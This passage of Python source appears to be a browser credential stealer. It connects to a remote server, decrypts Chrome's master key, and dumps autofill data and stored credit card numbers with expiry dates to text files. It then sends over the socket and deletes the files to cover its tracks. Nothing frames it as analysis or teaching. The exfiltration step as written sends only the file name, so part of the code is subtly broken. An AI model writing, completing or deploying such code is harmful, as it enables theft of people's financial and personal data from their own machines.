ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)

class Chrome:
    def __init__(self):
        self._user_data = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data"
        self._master_key = self._get_master_key()

    def _get_master_key(self):
        with open(self._user_data + "\\Local State", "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    @staticmethod
    def _decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return str(e)

    @staticmethod
    def _convert_time(time):
        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
        code_stamp = epoch + timedelta(microseconds=time)
        return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')


    def web_data(self):
        try:
            web_data_db = self._user_data + "\\Default\\Web Data"
            web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
            shutil.copy2(web_data_db, web_data_db_copy)
            conn = sqlite3.connect(web_data_db_copy)
            cursor = conn.cursor()

            try:
                cursor.execute("SELECT name, value FROM autofill")

                with open("autofill.txt", "w", encoding="utf-8") as f:
                    for item in cursor.fetchall():
                        name = item[0]
                        value = item[1]
                        f.write(f"{name}: {value}\n")

                cursor.execute("SELECT * FROM credit_cards")

                with open("credit_cards.txt", "w", encoding="utf-8") as f:
                    for item in cursor.fetchall():
                        username = item[1]
                        encrypted_password = item[4]
                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
                        expire_mon = item[2]
                        expire_year = item[3]
                        f.write(f"USR: {username}\nPDW: {decrypted_password}\nEXP: {expire_mon}/{expire_year}\n\n")

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(web_data_db_copy)
        except Exception as e:
            print(f"[!]Error: {e}")

def compress():
    try:
        files = ["credit_cards.txt"]
        for file in files:
        	send(file)
        for file in files:
            os.remove(file)
    except Exception as e:
        print(f"Error: {e}")
            

if __name__ == "__main__":
    chrome = Chrome()
    chrome.web_data()
    compress()